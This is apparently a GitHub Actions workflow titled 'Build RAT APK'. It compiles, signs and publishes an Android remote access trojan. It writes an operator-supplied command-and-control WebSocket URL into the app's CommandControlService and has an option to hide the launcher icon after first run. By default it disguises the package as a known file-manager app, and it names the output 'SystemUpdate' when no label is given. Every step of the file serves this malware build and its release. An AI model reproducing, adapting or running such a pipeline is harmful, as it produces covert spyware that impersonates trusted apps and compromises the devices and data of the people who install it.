name: Build RAT APK

on:
  workflow_dispatch:
    inputs:
      c2_url:
        description: "C2 WebSocket URL — e.g. wss://your-app.onrender.com/ws"
        required: true
        type: string
      app_label:
        description: "Visible app label (leave blank to keep original)"
        required: false
        default: ""
        type: string
      hide_icon:
        description: "Hide launcher icon after first run"
        required: false
        default: "false"
        type: choice
        options: ["false", "true"]
      app_id:
        description: "APK package name (disguise)"
        required: false
        default: "com.estrongs.android.pop"
        type: string

jobs:
  build:
    name: Build & Sign APK
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
          cache: gradle

      # ── Inject C2 URL ──────────────────────────────────────────────────────
      - name: Inject C2 URL
        run: |
          CCS="android/app/src/main/java/com/seguranca/protecao/CommandControlService.java"
          URL="${{ github.event.inputs.c2_url }}"
          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" "$CCS"
          grep "SERVER_URL" "$CCS" | head -1

      # ── Set HIDE_ICON ──────────────────────────────────────────────────────
      - name: Set HIDE_ICON
        run: |
          CCS="android/app/src/main/java/com/seguranca/protecao/CommandControlService.java"
          HIDE="${{ github.event.inputs.hide_icon }}"
          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};|g" "$CCS"

      # ── Override app label ─────────────────────────────────────────────────
      - name: Override app label
        if: ${{ github.event.inputs.app_label != '' }}
        run: |
          LABEL="${{ github.event.inputs.app_label }}"
          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">${LABEL}</string>|g" \
            android/app/src/main/res/values/strings.xml
          echo "Label → ${LABEL}"

      # ── Override application ID ────────────────────────────────────────────
      - name: Override application ID
        run: |
          APP_ID="${{ github.event.inputs.app_id }}"
          sed -i "s|applicationId \"[^\"]*\"|applicationId \"${APP_ID}\"|g" android/app/build.gradle
          echo "App ID → ${APP_ID}"

      # ── Keystore ──────────────────────────────────────────────────────────
      # Bundled keystore: android/google-services-release.jks (already in repo)
      # Override: set KEYSTORE_BASE64 secret + KEYSTORE_PASSWORD + KEY_ALIAS + KEY_PASSWORD
      - name: Prepare keystore
        run: |
          if [ -n "${{ secrets.KEYSTORE_BASE64 }}" ]; then
            echo "Using provided keystore"
            echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/google-services-release.jks
            KP="${{ secrets.KEYSTORE_PASSWORD }}"
            KA="${{ secrets.KEY_ALIAS }}"
            KPP="${{ secrets.KEY_PASSWORD }}"
            if [ -n "$KP" ]; then
              sed -i "s|storePassword '[^']*'|storePassword '${KP}'|g" android/app/build.gradle
              sed -i "s|keyPassword '[^']*'|keyPassword '${KPP}'|g" android/app/build.gradle
              sed -i "s|keyAlias '[^']*'|keyAlias '${KA}'|g" android/app/build.gradle
            fi
          else
            echo "Using bundled keystore"
            ls -lh android/google-services-release.jks
          fi

      - name: Make Gradle executable
        run: chmod +x android/gradlew

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: ${{ runner.os }}-gradle-${{ hashFiles('android/**/*.gradle*', 'android/**/gradle-wrapper.properties') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      # ── Build ──────────────────────────────────────────────────────────────
      - name: Build release APK
        working-directory: android
        run: ./gradlew assembleRelease --no-daemon --stacktrace 2>&1 | tail -120

      # ── Locate APK (verbose — shows exactly what was built) ───────────────
      - name: Locate and rename APK
        run: |
          echo "=== All APKs produced ==="
          find . -name "*.apk" 2>/dev/null || true

          # Try signed release first, then unsigned, then any apk
          APK=$(find . -name "app-release.apk" | head -1)
          if [ -z "$APK" ]; then
            APK=$(find . -name "app-release-unsigned.apk" | head -1)
            echo "Note: using unsigned APK (signing may have failed)"
          fi
          if [ -z "$APK" ]; then
            APK=$(find . -name "*.apk" -path "*/release/*" | head -1)
          fi
          if [ -z "$APK" ]; then
            APK=$(find . -name "*.apk" -path "*/outputs/*" | head -1)
          fi
          if [ -z "$APK" ]; then
            echo "ERROR: No APK found. Full build output:"
            find . -name "*.apk" 2>/dev/null
            exit 1
          fi

          echo "APK located: $APK"
          echo "APK size: $(du -sh "$APK" | cut -f1)"

          # Build output filename
          LABEL="${{ github.event.inputs.app_label }}"
          [ -z "$LABEL" ] && LABEL="SystemUpdate"
          SAFE="${LABEL// /_}"
          OUT="${SAFE}_build${{ github.run_number }}.apk"
          cp "$APK" "$OUT"
          echo "Output: $OUT"
          echo "APK_PATH=$OUT" >> $GITHUB_ENV

      # ── Upload ─────────────────────────────────────────────────────────────
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: apk-build-${{ github.run_number }}
          path: "*.apk"
          retention-days: 30

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: "build-${{ github.run_number }}"
          name: "APK Build #${{ github.run_number }}"
          body: |
            | Field | Value |
            |---|---|
            | **C2 URL** | `${{ github.event.inputs.c2_url }}` |
            | **App Label** | ${{ github.event.inputs.app_label || '(original)' }} |
            | **App ID** | `${{ github.event.inputs.app_id }}` |
            | **Hide Icon** | ${{ github.event.inputs.hide_icon }} |
            | **Build** | #${{ github.run_number }} |
          files: "*.apk"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
